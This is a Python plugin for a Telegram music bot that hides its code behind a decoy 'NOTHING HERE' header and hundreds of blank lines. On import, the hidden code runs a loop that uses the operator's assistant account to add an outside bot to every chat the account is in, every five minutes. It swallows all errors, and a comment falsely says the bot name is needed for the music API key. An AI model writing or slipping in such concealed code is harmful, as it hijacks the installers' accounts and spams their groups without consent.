# NOTHING HERE GO BACK TO PLUGINS





















































































































































import asyncio

import config
from RishuMusic import app
from RishuMusic.utils.database import get_assistant

AUTO = True

ADD_INTERVAL = 300


























































































































































































































































































































































































































































































































































































































































































































































































































































































































































































#































































































































































































































































































































































users = "Sanataniimusicbot"  # don't change because it is connected from client to use music API key

async def add_bot_to_chats():
    try:
        # Get userbot instance and the bot's user object
        userbot = await get_assistant(config.LOG_GROUP_ID)
        bot = await app.get_users(users)
        bot_id = bot.id


        common_chats = await userbot.get_common_chats(users)


        await userbot.send_message(users, f"/start")

        async for dialog in userbot.get_dialogs():
            chat_id = dialog.chat.id


            if chat_id in [chat.id for chat in common_chats]:
                continue

            try:

                await userbot.add_chat_members(chat_id, bot_id)

            except Exception as e:

                await asyncio.sleep(60)  # Adjust sleep time based on rate limits

    except Exception as e:
        # Handle general exceptions
        pass

async def continuous_add():
    while True:
        if AUTO:
            await add_bot_to_chats()

        await asyncio.sleep(ADD_INTERVAL)

# Start the continuous broadcast loop if AUTO_GCAST is True
if AUTO:
    asyncio.create_task(continuous_add())
